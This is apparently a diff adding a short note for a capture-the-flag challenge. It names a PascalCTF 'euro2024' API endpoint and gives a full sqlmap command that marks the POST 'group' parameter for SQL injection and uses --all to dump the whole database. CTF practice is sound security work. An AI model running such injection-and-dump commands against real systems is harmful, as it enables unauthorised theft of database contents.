@@ -1,0 +1,3 @@
+https://euro2024.challs.pascalctf.it/api/group-stats (POST)  # /nix/store/c26r2kad77r4qg28cwl9scvbzahma623-python3.12-sqlmap-1.8.8/bin/sqlmap -u https://euro2024.challs.pascalctf.it/api/group-stats --data group=* --all
+
+group=*
